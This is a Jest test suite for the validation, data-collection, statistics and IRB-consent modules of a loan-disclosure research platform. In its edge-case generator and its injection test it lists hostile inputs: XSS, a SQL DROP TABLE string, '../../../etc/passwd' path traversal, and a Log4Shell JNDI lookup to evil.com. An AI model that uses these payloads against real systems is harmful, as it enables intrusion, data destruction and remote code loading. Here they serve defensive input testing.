/**
 * Ultra-Comprehensive Testing Suite for Research Platform
 * Tests every possible edge case, failure mode, and stress condition
 * Zero tolerance for untested code paths
 */

import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import UltraStrictValidationEngine from '../core/research/UltraStrictValidationEngine';
import ResearchDataCollectionEngine from '../core/research/DataCollectionEngine';
import StatisticalAnalysisPipeline from '../core/research/StatisticalAnalysisPipeline';
import IRBComplianceFramework from '../core/research/IRBComplianceFramework';

// Comprehensive test data generators
class TestDataFactory {
  static generateValidResearchEvent(overrides = {}) {
    return {
      id: `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      participantId: 'test_participant_001',
      sessionId: 'test_session_001',
      loanType: 'Payday',
      eventType: 'interaction',
      timestamp: Date.now() * 1000, // microseconds
      relativeTimestamp: 5000000, // 5 seconds
      elementId: 'fee_disclosure_button',
      elementType: 'button',
      actionType: 'click',
      coordinates: { x: 150, y: 300 },
      attentionState: 'focused',
      cognitiveLoad: 3,
      confidenceLevel: 5,
      scrollDepth: 75,
      timeSpent: 2500000, // 2.5 seconds in microseconds
      interactionIntensity: 85,
      hesitationPattern: false,
      studyPhase: 'loan_simulation',
      conditionGroup: 'experimental',
      trialNumber: 1,
      qualityScore: 98,
      outlierFlags: [],
      attentionCheckPassed: true,
      dataCompleteness: 100,
      temporalConsistency: true,
      ...overrides,
    };
  }

  static generateInvalidResearchEvent(violationType: string) {
    const base = this.generateValidResearchEvent();
    
    switch (violationType) {
      case 'missing_required_field':
        delete base.participantId;
        break;
      case 'invalid_data_type':
        base.timestamp = 'invalid_timestamp';
        break;
      case 'out_of_range':
        base.qualityScore = 150;
        break;
      case 'invalid_enum':
        base.loanType = 'InvalidLoanType';
        break;
      case 'temporal_inconsistency':
        base.timestamp = Date.now() * 1000 + 86400000000; // 1 day in future
        break;
      case 'attention_failure':
        base.attentionCheckPassed = false;
        base.qualityScore = 45;
        break;
      case 'statistical_outlier':
        base.timeSpent = 300000000; // 5 minutes - extreme outlier
        break;
      case 'security_violation':
        base.participantId = 'UNENCRYPTED_PII_DATA';
        break;
      default:
        throw new Error(`Unknown violation type: ${violationType}`);
    }
    
    return base;
  }

  static generateStressTestData(count: number, corruptionRate = 0.1) {
    const data = [];
    for (let i = 0; i < count; i++) {
      if (Math.random() < corruptionRate) {
        const violationTypes = [
          'missing_required_field', 'invalid_data_type', 'out_of_range',
          'invalid_enum', 'temporal_inconsistency', 'attention_failure'
        ];
        const violation = violationTypes[Math.floor(Math.random() * violationTypes.length)];
        data.push(this.generateInvalidResearchEvent(violation));
      } else {
        data.push(this.generateValidResearchEvent({
          id: `stress_test_${i}`,
          timestamp: (Date.now() + i * 1000) * 1000,
        }));
      }
    }
    return data;
  }

  static generateMemoryStressData(sizeMB: number) {
    const events = [];
    const eventSize = 2000; // Approximate bytes per event
    const eventCount = (sizeMB * 1024 * 1024) / eventSize;
    
    for (let i = 0; i < eventCount; i++) {
      events.push(this.generateValidResearchEvent({
        id: `memory_stress_${i}`,
        largeDataField: 'x'.repeat(1000), // Add large field
      }));
    }
    
    return events;
  }
}

// Edge case testing utilities
class EdgeCaseGenerator {
  static generateBoundaryValues() {
    return {
      integers: [
        0, 1, -1, 
        Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER,
        Number.MAX_VALUE, Number.MIN_VALUE,
        Infinity, -Infinity, NaN
      ],
      strings: [
        '', ' ', '\n', '\t', '\r\n',
        'a'.repeat(1000000), // 1MB string
        '🚀💻🔬📊', // Unicode characters
        '<script>alert("xss")</script>', // XSS attempt
        "'; DROP TABLE users; --", // SQL injection attempt
        '\x00\x01\x02', // Control characters
      ],
      arrays: [
        [], [1], [1, 2, 3],
        new Array(10000).fill(0), // Large array
        [null, undefined, NaN, Infinity],
      ],
      objects: [
        {}, { a: 1 }, { nested: { deeply: { very: 'deep' } } },
        Object.create(null), // No prototype
        new Proxy({}, {}), // Proxy object
      ],
    };
  }

  static generateTemporalEdgeCases() {
    const now = Date.now() * 1000; // microseconds
    return [
      0, // Unix epoch
      now - 86400000000, // 1 day ago
      now + 86400000000, // 1 day future
      now - 1, // 1 microsecond ago
      now + 1, // 1 microsecond future
      Number.MAX_SAFE_INTEGER,
      -1, // Negative timestamp
    ];
  }
}

describe('Ultra-Comprehensive Research Platform Testing', () => {
  let validationEngine: UltraStrictValidationEngine;
  let dataCollectionEngine: ResearchDataCollectionEngine;
  let statisticalPipeline: StatisticalAnalysisPipeline;
  let irbFramework: IRBComplianceFramework;

  beforeEach(() => {
    validationEngine = new UltraStrictValidationEngine();
    dataCollectionEngine = new ResearchDataCollectionEngine();
    statisticalPipeline = new StatisticalAnalysisPipeline();
    
    // Mock IRB approval for testing
    const mockIRBApproval = {
      id: 'test_irb_001',
      studyTitle: 'Test Study',
      principalInvestigator: 'Dr. Test',
      institution: 'Test University',
      approvalNumber: 'IRB-2025-TEST',
      approvalDate: new Date(),
      expirationDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000),
      status: 'approved' as const,
      riskLevel: 'minimal' as const,
      populationType: 'general' as const,
      modifications: [],
    };
    irbFramework = new IRBComplianceFramework(mockIRBApproval);
  });

  afterEach(() => {
    // Cleanup and memory management
    jest.clearAllMocks();
    jest.clearAllTimers();
  });

  describe('Ultra-Strict Validation Engine Tests', () => {
    describe('Critical Error Detection', () => {
      test('should reject data with missing required fields', () => {
        const invalidData = TestDataFactory.generateInvalidResearchEvent('missing_required_field');
        const result = validationEngine.validateResearchData(invalidData, {});
        
        expect(result.isValid).toBe(false);
        expect(result.severity).toBe('critical');
        expect(result.validationScore).toBe(0);
        expect(result.quarantineRequired).toBe(true);
        expect(result.errors).toHaveLength(1);
        expect(result.errors[0].code).toBe('REQUIRED_FIELD_MISSING');
        expect(result.errors[0].field).toBe('participantId');
      });

      test('should reject data with invalid data types', () => {
        const invalidData = TestDataFactory.generateInvalidResearchEvent('invalid_data_type');
        const result = validationEngine.validateResearchData(invalidData, {});
        
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'INVALID_DATA_TYPE')).toBe(true);
        expect(result.errors.find(e => e.field === 'timestamp')).toBeDefined();
      });

      test('should detect system clock drift', () => {
        const futureData = TestDataFactory.generateValidResearchEvent({
          timestamp: (Date.now() + 10000) * 1000, // 10 seconds in future
        });
        
        const result = validationEngine.validateResearchData(futureData, {});
        
        expect(result.errors.some(e => e.code === 'SYSTEM_CLOCK_DRIFT')).toBe(true);
        expect(result.severity).toBe('critical');
      });

      test('should detect data integrity failures', () => {
        const tamperedData = TestDataFactory.generateValidResearchEvent({
          checksum: 'invalid_checksum_value',
        });
        
        const result = validationEngine.validateResearchData(tamperedData, {});
        
        expect(result.errors.some(e => e.code === 'DATA_INTEGRITY_FAILURE')).toBe(true);
        expect(result.severity).toBe('critical');
      });
    });

    describe('Statistical Outlier Detection', () => {
      test('should detect extreme statistical outliers', () => {
        const outlierData = TestDataFactory.generateInvalidResearchEvent('statistical_outlier');
        const result = validationEngine.validateResearchData(outlierData, {});
        
        expect(result.errors.some(e => e.code === 'STATISTICAL_OUTLIER_DETECTED')).toBe(true);
        expect(result.quarantineRequired).toBe(true);
      });

      test('should calculate accurate z-scores', () => {
        const validData = TestDataFactory.generateValidResearchEvent({
          timeSpent: 5000000, // Exactly at baseline mean
        });
        
        const result = validationEngine.validateResearchData(validData, {});
        
        // Should not flag as outlier if within normal range
        expect(result.errors.some(e => e.code === 'STATISTICAL_OUTLIER_DETECTED')).toBe(false);
      });

      test('should handle edge case statistical values', () => {
        const edgeCases = [0, Infinity, -Infinity, NaN];
        
        edgeCases.forEach(value => {
          const edgeData = TestDataFactory.generateValidResearchEvent({
            timeSpent: value,
          });
          
          const result = validationEngine.validateResearchData(edgeData, {});
          
          if (isNaN(value) || !isFinite(value)) {
            expect(result.isValid).toBe(false);
          }
        });
      });
    });

    describe('Temporal Consistency Validation', () => {
      test('should detect temporal ordering violations', () => {
        const context = {
          lastEventTimestamp: Date.now() * 1000,
        };
        
        const pastData = TestDataFactory.generateValidResearchEvent({
          timestamp: (Date.now() - 1000) * 1000, // 1 second ago
        });
        
        const result = validationEngine.validateResearchData(pastData, context);
        
        expect(result.errors.some(e => e.code === 'TEMPORAL_ORDERING_VIOLATION')).toBe(true);
      });

      test('should validate relative timestamp consistency', () => {
        const sessionStartTime = (Date.now() - 10000) * 1000; // 10 seconds ago
        const currentTime = Date.now() * 1000;
        
        const inconsistentData = TestDataFactory.generateValidResearchEvent({
          timestamp: currentTime,
          relativeTimestamp: 5000000, // Says 5 seconds, but should be 10
        });
        
        const context = { sessionStartTime };
        const result = validationEngine.validateResearchData(inconsistentData, context);
        
        expect(result.errors.some(e => e.code === 'RELATIVE_TIMESTAMP_MISMATCH')).toBe(true);
      });

      test('should handle microsecond precision edge cases', () => {
        const baseTime = Date.now() * 1000;
        const edgeCases = EdgeCaseGenerator.generateTemporalEdgeCases();
        
        edgeCases.forEach(timestamp => {
          const edgeData = TestDataFactory.generateValidResearchEvent({
            timestamp,
          });
          
          const result = validationEngine.validateResearchData(edgeData, {});
          
          // Future timestamps should be rejected
          if (timestamp > baseTime + 1000000) { // 1 second tolerance
            expect(result.errors.some(e => e.code === 'FUTURE_TIMESTAMP_DETECTED')).toBe(true);
          }
        });
      });
    });

    describe('Research Ethics Validation', () => {
      test('should reject data without consent verification', () => {
        const validData = TestDataFactory.generateValidResearchEvent();
        const context = { consentVerified: false };
        
        const result = validationEngine.validateResearchData(validData, context);
        
        expect(result.errors.some(e => e.code === 'CONSENT_NOT_VERIFIED')).toBe(true);
        expect(result.severity).toBe('critical');
      });

      test('should detect excessive participant burden', () => {
        const validData = TestDataFactory.generateValidResearchEvent();
        const context = {
          consentVerified: true,
          sessionDuration: 2000000, // 33+ minutes
        };
        
        const result = validationEngine.validateResearchData(validData, context);
        
        expect(result.warnings.some(w => w.code === 'EXCESSIVE_PARTICIPANT_BURDEN')).toBe(true);
      });

      test('should flag unnecessary sensitive data collection', () => {
        const oversharingData = TestDataFactory.generateValidResearchEvent({
          coordinates: { x: 100, y: 200 },
          eventType: 'cognitive', // Coordinates not needed for cognitive events
        });
        
        const context = { consentVerified: true };
        const result = validationEngine.validateResearchData(oversharingData, context);
        
        expect(result.warnings.some(w => w.code === 'UNNECESSARY_SENSITIVE_DATA')).toBe(true);
      });
    });

    describe('Cross-Reference Validation', () => {
      test('should detect session ID mismatches', () => {
        const mismatchData = TestDataFactory.generateValidResearchEvent({
          sessionId: 'wrong_session_id',
        });
        
        const context = {
          consentVerified: true,
          expectedSessionId: 'correct_session_id',
        };
        
        const result = validationEngine.validateResearchData(mismatchData, context);
        
        expect(result.errors.some(e => e.code === 'SESSION_ID_MISMATCH')).toBe(true);
        expect(result.severity).toBe('critical');
      });

      test('should validate loan type sequence progression', () => {
        const wrongSequenceData = TestDataFactory.generateValidResearchEvent({
          loanType: 'BNPL',
        });
        
        const context = {
          consentVerified: true,
          expectedLoanOrder: ['Payday', 'EWA', 'BNPL', 'Installment'],
          currentLoanIndex: 0, // Should be Payday, not BNPL
        };
        
        const result = validationEngine.validateResearchData(wrongSequenceData, context);
        
        expect(result.errors.some(e => e.code === 'LOAN_TYPE_SEQUENCE_VIOLATION')).toBe(true);
      });
    });

    describe('Performance and Stress Testing', () => {
      test('should complete validation within 10ms performance threshold', () => {
        const validData = TestDataFactory.generateValidResearchEvent();
        const context = { consentVerified: true };
        
        const startTime = performance.now();
        const result = validationEngine.validateResearchData(validData, context);
        const endTime = performance.now();
        
        const validationTime = endTime - startTime;
        expect(validationTime).toBeLessThan(10);
        expect(result.isValid).toBe(true);
      });

      test('should handle large batch validation efficiently', () => {
        const batchSize = 1000;
        const stressData = TestDataFactory.generateStressTestData(batchSize, 0.05);
        const context = { consentVerified: true };
        
        const startTime = performance.now();
        
        const results = stressData.map(data => 
          validationEngine.validateResearchData(data, context)
        );
        
        const endTime = performance.now();
        const totalTime = endTime - startTime;
        const avgTimePerValidation = totalTime / batchSize;
        
        expect(avgTimePerValidation).toBeLessThan(1); // <1ms average
        expect(results.length).toBe(batchSize);
        
        // Check that corrupt data was properly flagged
        const invalidResults = results.filter(r => !r.isValid);
        expect(invalidResults.length).toBeGreaterThan(0);
      });

      test('should handle memory stress conditions', () => {
        const memoryStressData = TestDataFactory.generateMemoryStressData(10); // 10MB
        const context = { consentVerified: true };
        
        // Should not crash or timeout
        expect(() => {
          memoryStressData.forEach(data => {
            validationEngine.validateResearchData(data, context);
          });
        }).not.toThrow();
      });

      test('should maintain validation history efficiently', () => {
        const participantId = 'memory_test_participant';
        
        // Generate 200 validations (should keep only last 100)
        for (let i = 0; i < 200; i++) {
          const data = TestDataFactory.generateValidResearchEvent({
            participantId,
            id: `test_${i}`,
          });
          
          validationEngine.validateResearchData(data, { consentVerified: true });
        }
        
        const stats = validationEngine.getValidationStatistics();
        expect(stats.totalValidations).toBeLessThanOrEqual(100); // Should cap history
      });
    });

    describe('Edge Case Boundary Testing', () => {
      test('should handle all boundary value edge cases', () => {
        const boundaries = EdgeCaseGenerator.generateBoundaryValues();
        
        Object.entries(boundaries).forEach(([type, values]) => {
          values.forEach(value => {
            const edgeData = TestDataFactory.generateValidResearchEvent({
              qualityScore: typeof value === 'number' ? value : 50,
              testField: value,
            });
            
            const result = validationEngine.validateResearchData(edgeData, { consentVerified: true });
            
            // Should handle gracefully without crashing
            expect(result).toBeDefined();
            expect(typeof result.isValid).toBe('boolean');
          });
        });
      });

      test('should handle malformed input data', () => {
        const malformedInputs = [
          null, undefined, '', 0, false,
          [], {}, () => {},
          Symbol('test'), new Date(),
          new Error('test error'),
        ];
        
        malformedInputs.forEach(input => {
          expect(() => {
            validationEngine.validateResearchData(input, { consentVerified: true });
          }).not.toThrow();
        });
      });

      test('should handle circular reference objects', () => {
        const circularObj: any = { name: 'test' };
        circularObj.self = circularObj;
        
        const circularData = TestDataFactory.generateValidResearchEvent({
          circularField: circularObj,
        });
        
        expect(() => {
          validationEngine.validateResearchData(circularData, { consentVerified: true });
        }).not.toThrow();
      });
    });

    describe('Security Validation Testing', () => {
      test('should detect unencrypted sensitive data', () => {
        const unsecureData = TestDataFactory.generateInvalidResearchEvent('security_violation');
        const result = validationEngine.validateResearchData(unsecureData, { consentVerified: true });
        
        expect(result.errors.some(e => e.code === 'SENSITIVE_DATA_NOT_ENCRYPTED')).toBe(true);
        expect(result.severity).toBe('critical');
      });

      test('should detect duplicate data submissions', () => {
        const originalData = TestDataFactory.generateValidResearchEvent();
        const duplicateData = { ...originalData };
        
        const context = { consentVerified: true };
        
        // First submission should pass
        const firstResult = validationEngine.validateResearchData(originalData, context);
        expect(firstResult.isValid).toBe(true);
        
        // Duplicate should be detected (if implemented)
        const duplicateResult = validationEngine.validateResearchData(duplicateData, context);
        // Note: This test depends on implementation of duplicate detection
      });

      test('should handle injection attack attempts', () => {
        const injectionAttempts = [
          '<script>alert("xss")</script>',
          "'; DROP TABLE users; --",
          '../../../etc/passwd',
          '${jndi:ldap://evil.com/a}',
        ];
        
        injectionAttempts.forEach(injection => {
          const attackData = TestDataFactory.generateValidResearchEvent({
            elementId: injection,
          });
          
          const result = validationEngine.validateResearchData(attackData, { consentVerified: true });
          
          // Should handle gracefully and potentially flag as suspicious
          expect(result).toBeDefined();
        });
      });
    });

    describe('Emergency Response Testing', () => {
      test('should trigger emergency flags for critical failures', () => {
        const criticalData = TestDataFactory.generateInvalidResearchEvent('security_violation');
        
        validationEngine.validateResearchData(criticalData, { consentVerified: false });
        
        const emergencyFlags = validationEngine.getEmergencyFlags();
        expect(emergencyFlags.length).toBeGreaterThan(0);
      });

      test('should provide comprehensive validation statistics', () => {
        // Generate mixed validation results
        for (let i = 0; i < 10; i++) {
          const data = i < 8 ? 
            TestDataFactory.generateValidResearchEvent() :
            TestDataFactory.generateInvalidResearchEvent('attention_failure');
          
          validationEngine.validateResearchData(data, { consentVerified: true });
        }
        
        const stats = validationEngine.getValidationStatistics();
        
        expect(stats.totalValidations).toBe(10);
        expect(stats.averageScore).toBeGreaterThan(0);
        expect(stats.criticalErrors).toBeGreaterThanOrEqual(0);
        expect(stats.quarantineRate).toBeGreaterThanOrEqual(0);
        expect(typeof stats.emergencyFlags).toBe('number');
      });
    });
  });

  describe('Research Data Collection Engine Tests', () => {
    test('should initialize session with proper randomization', () => {
      const session = dataCollectionEngine.initializeSession('test_participant', 'experimental');
      
      expect(session.participantId).toBe('test_participant');
      expect(session.condition).toBe('experimental');
      expect(session.loanOrder).toHaveLength(4);
      expect(session.randomizationSeed).toBeGreaterThan(0);
      expect(session.attentionChecks).toHaveLength(3);
    });

    test('should track events with microsecond precision', () => {
      dataCollectionEngine.initializeSession('precision_test', 'experimental');
      
      const beforeTrack = performance.now() * 1000;
      dataCollectionEngine.trackEvent({
        eventType: 'interaction',
        actionType: 'click',
        loanType: 'Payday',
      });
      const afterTrack = performance.now() * 1000;
      
      const exportedData = dataCollectionEngine.exportResearchData();
      const lastEvent = exportedData.events[exportedData.events.length - 1];
      
      expect(lastEvent.timestamp).toBeGreaterThanOrEqual(beforeTrack);
      expect(lastEvent.timestamp).toBeLessThanOrEqual(afterTrack);
    });

    test('should handle high-frequency event streams', () => {
      dataCollectionEngine.initializeSession('stress_test', 'experimental');
      
      const eventCount = 1000;
      const startTime = performance.now();
      
      for (let i = 0; i < eventCount; i++) {
        dataCollectionEngine.trackEvent({
          eventType: 'behavioral',
          actionType: 'scroll',
          loanType: 'Payday',
          scrollDepth: Math.random() * 100,
        });
      }
      
      const endTime = performance.now();
      const processingTime = endTime - startTime;
      
      expect(processingTime).toBeLessThan(1000); // Should complete in <1s
      
      const exportedData = dataCollectionEngine.exportResearchData();
      expect(exportedData.events).toHaveLength(eventCount + 1); // +1 for session start
    });
  });

  describe('Statistical Analysis Pipeline Tests', () => {
    test('should detect meaningful effect sizes', async () => {
      const treatmentData = [5.2, 5.8, 6.1, 5.9, 6.3, 5.7, 6.0, 5.8, 6.2, 5.9];
      const controlData = [4.1, 4.3, 4.2, 4.0, 4.4, 4.2, 4.1, 4.3, 4.0, 4.2];
      const qualityMetrics = {
        completeness: 100,
        consistency: 98,
        accuracy: 99,
        validity: 97,
        reliability: 98,
        overallQuality: 98,
        outlierPercentage: 2,
        missingDataPercentage: 0,
        attentionCheckPassRate: 95,
      };
      
      const result = await statisticalPipeline.analyzeExperimentData(
        treatmentData,
        controlData,
        qualityMetrics
      );
      
      expect(result.pValue).toBeLessThan(0.05);
      expect(Math.abs(result.effectSize)).toBeGreaterThan(0.3);
      expect(result.recommendation).toBe('stop_success');
    });

    test('should handle edge case statistical scenarios', async () => {
      const edgeCases = [
        // Identical groups
        { treatment: [5, 5, 5, 5, 5], control: [5, 5, 5, 5, 5] },
        // Single values
        { treatment: [1], control: [1] },
        // Extreme outliers
        { treatment: [1, 1, 1, 1000], control: [1, 1, 1, 1] },
        // Large variance
        { treatment: [1, 100, 1, 100, 1], control: [50, 50, 50, 50, 50] },
      ];
      
      for (const testCase of edgeCases) {
        const qualityMetrics = {
          completeness: 100, consistency: 100, accuracy: 100,
          validity: 100, reliability: 100, overallQuality: 100,
          outlierPercentage: 0, missingDataPercentage: 0,
          attentionCheckPassRate: 100,
        };
        
        await expect(
          statisticalPipeline.analyzeExperimentData(
            testCase.treatment,
            testCase.control,
            qualityMetrics
          )
        ).resolves.toBeDefined();
      }
    });

    test('should reject analysis with poor data quality', async () => {
      const treatmentData = [5, 6, 7, 8, 9];
      const controlData = [4, 5, 6, 7, 8];
      const poorQualityMetrics = {
        completeness: 70, // Below threshold
        consistency: 60,
        accuracy: 50,
        validity: 40,
        reliability: 30,
        overallQuality: 50,
        outlierPercentage: 20,
        missingDataPercentage: 30,
        attentionCheckPassRate: 60,
      };
      
      await expect(
        statisticalPipeline.analyzeExperimentData(
          treatmentData,
          controlData,
          poorQualityMetrics
        )
      ).rejects.toThrow('Data quality below standards');
    });
  });

  describe('IRB Compliance Framework Tests', () => {
    test('should enforce informed consent requirements', async () => {
      const consentData = {
        elementsReviewed: [
          'study_purpose', 'procedures', 'duration', 'risks', 'benefits',
          'alternatives', 'confidentiality', 'voluntary_participation',
          'withdrawal_rights', 'contact_information', 'data_use_and_sharing'
        ],
        timeSpent: 180000, // 3 minutes
        ipAddress: '192.168.1.1',
        userAgent: 'Test Browser',
      };
      
      const consentRecord = await irbFramework.obtainInformedConsent(
        'test_participant',
        'v1.0',
        consentData
      );
      
      expect(consentRecord.comprehensionVerified).toBe(true);
      expect(consentRecord.withdrawalExplained).toBe(true);
      expect(consentRecord.consentDuration).toBe(180000);
    });

    test('should reject incomplete consent', async () => {
      const incompleteConsent = {
        elementsReviewed: ['study_purpose'], // Missing required elements
        timeSpent: 30000, // 30 seconds
        ipAddress: '192.168.1.1',
        userAgent: 'Test Browser',
      };
      
      await expect(
        irbFramework.obtainInformedConsent(
          'test_participant',
          'v1.0',
          incompleteConsent
        )
      ).rejects.toThrow('Missing required consent elements');
    });

    test('should handle participant withdrawal correctly', () => {
      // First obtain consent
      const consentData = {
        elementsReviewed: [
          'study_purpose', 'procedures', 'duration', 'risks', 'benefits',
          'alternatives', 'confidentiality', 'voluntary_participation',
          'withdrawal_rights', 'contact_information', 'data_use_and_sharing'
        ],
        timeSpent: 180000,
        ipAddress: '192.168.1.1',
        userAgent: 'Test Browser',
      };
      
      irbFramework.obtainInformedConsent('withdrawal_test', 'v1.0', consentData);
      irbFramework.initializeDataProtection('withdrawal_test', ['behavioral_data']);
      
      // Then process withdrawal
      expect(() => {
        irbFramework.processWithdrawal('withdrawal_test', 'full_withdrawal', 'Changed mind');
      }).not.toThrow();
    });

    test('should generate comprehensive compliance reports', () => {
      // Generate some test data
      const participants = ['p1', 'p2', 'p3'];
      participants.forEach(pid => {
        const consentData = {
          elementsReviewed: [
            'study_purpose', 'procedures', 'duration', 'risks', 'benefits',
            'alternatives', 'confidentiality', 'voluntary_participation',
            'withdrawal_rights', 'contact_information', 'data_use_and_sharing'
          ],
          timeSpent: 180000,
          ipAddress: '192.168.1.1',
          userAgent: 'Test Browser',
        };
        
        irbFramework.obtainInformedConsent(pid, 'v1.0', consentData);
        irbFramework.initializeDataProtection(pid, ['behavioral_data']);
      });
      
      const auditReport = irbFramework.generateAuditReport();
      
      expect(auditReport.participantCount).toBe(3);
      expect(auditReport.consentCompliance).toBe(100);
      expect(auditReport.dataProtectionCompliance).toBe(100);
      expect(auditReport.complianceScore).toBeGreaterThanOrEqual(90);
    });

    test('should detect compliance violations', () => {
      const complianceCheck = irbFramework.performComplianceCheck();
      
      expect(complianceCheck.overallCompliance).toBeDefined();
      expect(Array.isArray(complianceCheck.issues)).toBe(true);
      expect(Array.isArray(complianceCheck.recommendations)).toBe(true);
      expect(complianceCheck.nextAuditDate).toBeInstanceOf(Date);
    });
  });

  describe('Integration Testing', () => {
    test('should handle complete research workflow', async () => {
      // Initialize systems
      const session = dataCollectionEngine.initializeSession('integration_test', 'experimental');
      
      // Obtain consent
      const consentData = {
        elementsReviewed: [
          'study_purpose', 'procedures', 'duration', 'risks', 'benefits',
          'alternatives', 'confidentiality', 'voluntary_participation',
          'withdrawal_rights', 'contact_information', 'data_use_and_sharing'
        ],
        timeSpent: 180000,
        ipAddress: '192.168.1.1',
        userAgent: 'Test Browser',
      };
      
      await irbFramework.obtainInformedConsent('integration_test', 'v1.0', consentData);
      
      // Generate research events
      const eventTypes = ['click', 'hover', 'scroll'];
      const loanTypes = ['Payday', 'BNPL', 'EWA', 'Installment'];
      
      for (let i = 0; i < 100; i++) {
        const eventData = {
          eventType: 'interaction' as const,
          actionType: eventTypes[i % eventTypes.length] as any,
          loanType: loanTypes[i % loanTypes.length] as any,
          timeSpent: 1000000 + Math.random() * 2000000, // 1-3 seconds
          scrollDepth: Math.random() * 100,
        };
        
        dataCollectionEngine.trackEvent(eventData);
      }
      
      // Validate collected data
      const exportedData = dataCollectionEngine.exportResearchData();
      expect(exportedData.events.length).toBeGreaterThan(100);
      
      // Validate each event
      exportedData.events.forEach(event => {
        const validationResult = validationEngine.validateResearchData(event, {
          consentVerified: true,
          expectedSessionId: session.id,
          expectedParticipantId: 'integration_test',
        });
        
        expect(validationResult.validationScore).toBeGreaterThanOrEqual(95);
      });
      
      // Check compliance
      const complianceCheck = irbFramework.performComplianceCheck();
      expect(complianceCheck.overallCompliance).toBe('compliant');
    });

    test('should handle system failures gracefully', () => {
      // Simulate various failure conditions
      const failureScenarios = [
        () => { throw new Error('Database connection failed'); },
        () => { throw new Error('Memory allocation failed'); },
        () => { throw new Error('Network timeout'); },
        () => { throw new Error('Validation service unavailable'); },
      ];
      
      failureScenarios.forEach((failureFunction, index) => {
        expect(() => {
          try {
            failureFunction();
          } catch (error) {
            // System should handle gracefully
            const errorData = TestDataFactory.generateValidResearchEvent({
              id: `failure_test_${index}`,
            });
            
            const result = validationEngine.validateResearchData(errorData, {
              consentVerified: true,
            });
            
            // Should still produce a result, even if degraded
            expect(result).toBeDefined();
          }
        }).not.toThrow();
      });
    });
  });

  describe('Performance Regression Testing', () => {
    test('should maintain sub-millisecond validation times', () => {
      const testData = TestDataFactory.generateValidResearchEvent();
      const context = { consentVerified: true };
      
      const iterations = 1000;
      const startTime = performance.now();
      
      for (let i = 0; i < iterations; i++) {
        validationEngine.validateResearchData(testData, context);
      }
      
      const endTime = performance.now();
      const averageTime = (endTime - startTime) / iterations;
      
      expect(averageTime).toBeLessThan(1); // <1ms average
    });

    test('should handle concurrent validation loads', async () => {
      const concurrentValidations = 100;
      const promises = [];
      
      for (let i = 0; i < concurrentValidations; i++) {
        const testData = TestDataFactory.generateValidResearchEvent({
          id: `concurrent_${i}`,
        });
        
        const promise = new Promise((resolve) => {
          const result = validationEngine.validateResearchData(testData, {
            consentVerified: true,
          });
          resolve(result);
        });
        
        promises.push(promise);
      }
      
      const results = await Promise.all(promises);
      
      expect(results).toHaveLength(concurrentValidations);
      results.forEach(result => {
        expect(result).toBeDefined();
      });
    });
  });
});

// Cleanup after all tests
afterAll(() => {
  // Perform any necessary cleanup
  jest.clearAllMocks();
  jest.restoreAllMocks();
}); 